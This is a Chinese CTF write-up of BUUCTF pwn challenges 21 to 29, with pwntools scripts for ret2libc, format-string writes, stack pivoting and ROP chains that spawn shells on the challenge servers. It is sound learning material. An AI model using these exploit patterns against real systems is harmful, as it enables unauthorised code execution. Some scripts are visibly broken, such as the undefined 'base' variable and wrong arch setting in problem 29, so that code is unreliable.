# buuctf刷题记录（21-40题）

## 21_铁人三项（第五赛区) _2018_rop

ret2libc

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('node5.buuoj.cn',27252)
def dbg():
    gdb.attach(p)
    pause()
write_got = elf.got['write']
write_plt = elf.plt['write']
main = elf.sym['main']

payload = b'a'*0x88+b'b'*4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
p.sendline(payload)

write_addr = u32(p.recv(4))
libc  = LibcSearcher('write',write_addr)
libc_base = write_addr-libc.dump('write')
log.info("libc_base:"+hex(libc_base))

sys = libc_base+libc.dump('system')
binsh = libc_base+libc.dump('str_bin_sh')
payload2 = b'a'*0x88+b'b'*4+p32(sys)+p32(0)+p32(binsh)
p.sendline(payload2)
p.interactive()
```

## 22 bjdctf_2020_babystack2

看源码，发现输入长度是`int`型，而`read`读取的长度为`unsigned int`型，所以输入-1就可以了

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('node5.buuoj.cn',27683)
def dbg():
    gdb.attach(p)
    pause()
p.sendline('-1')
p.recvuntil(b'name?\n')
payload = b'a'*0x10+b'b'*0x8+p64(0x400726)
p.sendline(payload)
p.interactive()
```

## 23 bjdctf_2020_babyrop

ret2libc

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('node5.buuoj.cn',26423)
def dbg():
    gdb.attach(p)
    pause()
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main=elf.sym['main']
pop_rdi = 0x400733

p.recvuntil(b'story!\n')
payload = b'a'*0x20+b'b'*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
p.sendline(payload)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr-libc.dump('puts')

p.recvuntil(b'story!\n')
sys = libc_base+libc.dump('system')
binsh = libc_base+libc.dump('str_bin_sh')
payload2 = b'a'*0x20+b'b'*0x8+p64(pop_rdi)+p64(binsh)+p64(sys)+p64(main)
p.sendline(payload2)
p.interactive()
```

## 24 jarviso_fm

看名字就知道是格式化字符串，x==4的时候就可以getshell

直接找到x的地址，用自带函数就行

```python
from pwn import *
p = process('./pwn')
payload = fmtstr_payload(11,{0x804a02c:0x4})
p.sendline(payload)
p.interactive()
```

## 25 jatviso_tell_me_something

这道题有一点小坑,一般都是将`ebp`压入栈，然后将`esp`的值赋值给`ebp`，然后`esp`减去对应的栈空间的大小

```assembly
push	ebp
mov		ebp, esp
sub		esp, 18h
```

但是这道题直接将`rsp`减去0x88，这里并没有把`rbp`压入栈，所以只需要0x88大小就可以覆盖返回地址了

```python
from pwn import *

from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('node5.buuoj.cn',28402)
def dbg():
    gdb.attach(p)
    pause()

payload = b'a'*0x88+p64(0x400620)
p.recvuntil(':')
p.sendline(payload)
p.interactive()
```

## 26 ciscn_2019_es_2

发现溢出只有八字节，需要栈迁移

我觉得这位师傅讲的不错，[ciscn_2019_es_2](https://bbs.kanxue.com/thread-269163.htm)

```python
from pwn import * 
context.terminal = ['terminator','-x','sh','-c']
context.log_level='debug'
p=remote('node5.buuoj.cn',25052)
#p=process("./pwn")
elf = ELF('./pwn')
sys_addr=elf.sym['system']
leave_ret=0x080484b8
p.recvuntil("name?\n")
payload1= 0x20*"a"+"b"*0x8
p.send(payload1)
p.recvuntil("b"*0x8)
ebp_addr=u32(p.recv(4))

log.info('ebp:'+hex(ebp_addr))

payload2 = (b"aaaa"+p32(sys_addr)+b'aaaa'+p32(ebp_addr-0x28)+b'/bin/sh').ljust(0x28,b'\x00')+p32(ebp_addr-0x38) + p32(leave_ret)
p.send(payload2)
p.interactive()
```

### 栈迁移

`vul`函数看一下

```c
int vul()
{
  char s[40]; // [esp+0h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  read(0, s, 0x30u);
  printf("Hello, %s\n", s);
  read(0, s, 0x30u);
  return printf("Hello, %s\n", s);
}
```

可以看到`read`大小为0x30，但是s变量和ebp的距离是0x28。八字节的溢出只够覆盖`ebp`和`ret`，不可以做到直接修改`hack`函数里system的参数。**所以我们利用`leave_ret`挟持esp进行栈迁移**

若无限制，构造的栈长这样：

|            | /bin/sh      |
| ---------- | ------------ |
|            | /bin/sh_addr |
|            | 0xdeadbeef   |
| **return** | system_addr  |
| **ebp**    | aaaa         |
| **s**      | 垃圾数据     |
| **esp**    |              |

但是有限制，所以通过`leave`转移到别处，因此将`ebp`的内容改为`s`的地址，`return`改为`leave`的地址

执行两次leave之后栈的样子

| return  | leave_ret_addr |
| ------- | -------------- |
| **ebp** | s_addr         |
|         |                |
| **esp** |                |
| **s**   | 垃圾数据       |

一般leave命令后面都会跟着ret命令，也是必须要有的。此处如果继续执行ret命令就会返回到esp所指向内容填写的地址，那么接下来就很好办了，我们构造栈的内容

| **return** | leave_ret_addr |
| ---------- | -------------- |
| **ebp**    | aaaa           |
|            |                |
|            | /bin/sh        |
|            | /bin/sh_addr   |
|            | 0xdeadbeef     |
| **esp**    | system_addr    |
| **s**      | 垃圾数据       |

当然此处我们还有一个问题就是'/bin/sh'的地址我们不知道。我们可以通过泄露原来ebp的值来确定，我们将此地址叫做addr，以免和ebp寄存器混淆

```c
int vul()
{
    char s[40]; //	[esp+0h][ebp-28h]BYREF
    
    memset(s, 0x20u);
    read(0, s, 0x30u);
    printf("Hello, %s\n", s);
    read(0, s, 0x30u);
    return printf("Hello, %s\n", s);
}
```

可以看到有一个printf函数

printf函数会打印s字符串，且遇到0就会停止打印，所以如果我们将addr之前的内容全部填充不为0的字符，就能将addr打印出来，我们通过地址再计算出addr到s的距离，我们就可以通过addr来表示`/bin/sh`所在的地址了。

**我们先通过第一个`read`传入`payload`，然后通过`printf`打印出`addr`的值,然后通过第二个`read`函数构造栈转移，执行`systeam('/bin/sh')`**

## 27 HarekazeCTF2019 baby_rop2

ret2libc，但是用`printf`输出`read`函数的地址

```python
from pwn import *
from LibcSearcher import LibcSearcher
#p=process('./pwn')
p=remote('node5.buuoj.cn',25118)
elf=ELF('./pwn')

read_got=elf.got['read']
printf_plt=elf.plt['printf']
main_addr=elf.sym['main']
format_addr=0x400770	# 原本输出字符串的地址
pop_rdi = 0x400733
pop_rsi_r15 = 0x400731

payload=b'a'*0x20+b'b'*0x8	# 设置溢出覆盖返回地址
payload+=p64(pop_rdi)+p64(format_addr)	# pop_rdi弹入原本字符串
payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)
# ret到pop_rsi_r15，将read的got表地址弹入rsi，随便一个东西弹入r15
payload+=p64(printf_plt)+p64(main_addr)
# ret到printf的plt表地址，也就是调用plt，然后返回main

p.sendlineafter(b"name?",payload)
p.recvuntil(b'!\n')
read_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc=LibcSearcher("read",read_addr)
libc_base=read_addr-libc.dump('read')
log.info("libc_base:"+hex(libc_base))

sys_addr=libc_base+libc.dump("system")
binsh_addr=libc_base+libc.dump("str_bin_sh")
payload2=b'a'*40+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)+p64(0)
p.sendline(payload2)
p.interactive()
```

这道题远程直接`cat flag`不能用，先`find -name "flag"`找到flag放在了`./home/babyrop2/flag`里，再`cat`

## 28 picoctf_2018_rop chain

很简单的溢出、改数据，拿flag

注意里面这一句

```
if (win1 && win2 && a1 == -559039827)
```

是`win1和win2`,`a1和-559039827`,得到的结果再`&&`

```python
from pwn import *
#p = process('./pwn')
p = remote('node5.buuoj.cn',26736)
win1_addr = 0x80485CB
win2_addr = 0x80485D8
flag = 0x804862B
pop_ebp = 0x80485d6
payload = b'a'*0x18+b'b'*0x4+p32(win1_addr)+p32(win2_addr)+p32(flag)+p32(0xBAAAAAAD)+p32
(0xDEADBAAD)
# 先返回到win1使得win1 = 1
# 然后返回win2，因为要与ebp+8比较，所以中间先加一个flag_addr
# 比较好了直接返回到flag_addr
# 然后与ebp+8进行比较，正好夹了一个0xBAAAAAAD
p.sendline(payload)
p.interactive()
```

## 29 pwn2_sctf_2016

先输入一个负值就可以溢出了，跟正常libc没区别，~~就是我的LibcSearcher没找到对应的libc，看网上师傅的博客有说选13，但是我的只显示到9~~

*破案了，LibcSearcher会随机roll，看运气(有点过于艺术了)*

*roll了半个小时，靶机都过期了，算了，本地过了就行了，本地选5*

```python
from pwn import *
from LibcSearcher import *
from time import sleep
context(os='linux', arch='arm64', log_level='debug')
r = remote("node5.buuoj.cn",26858)
elf = ELF('./pwn')
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
start_addr = elf.sym['main']
r.recvuntil('read?')
r.sendline('-1')
r.recvuntil("data!\n")
payload = b'a' * (0x2c+4) + p32(printf_plt) + p32(start_addr) + p32(printf_got)
r.sendline(payload)
r.recvuntil('\n')
printf_addr=u32(r.recv(4))
libc = LibcSearcher('printf',printf_addr)

libc_base = printf_addr-libc.dump('printf')
system_addr = base+libc.dump('system')
bin_sh = base + libc.dump('str_bin_sh')
r.recvuntil('read?')
r.sendline('-1')
r.recvuntil("data!\n")
payload = b'a'*(0x2c+4)+p32(system_addr)+p32(start_addr)+p32(bin_sh)
r.sendline(payload)
r.interactive()
```

